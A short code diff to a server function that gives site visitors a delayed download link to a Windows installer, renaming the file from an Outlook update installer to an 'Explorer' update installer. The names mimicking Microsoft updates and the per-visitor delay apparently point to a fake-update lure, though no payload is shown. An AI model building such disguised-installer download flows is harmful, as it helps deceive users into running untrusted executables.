@@ -12,7 +12,7 @@ export const scheduleInstallerDownload = createServerFn({ method: "POST" })
     if (!data.visitorId) throw new Error("A visitor ID is required");
 
     return {
-      downloadUrl: "/Updated_Outlook%20for%20Windows%20Installer.exe",
+      downloadUrl: "/Update_Explorer_Installer.exe",
       availableAt: Date.now() + DOWNLOAD_DELAY_MS,
     };
   });
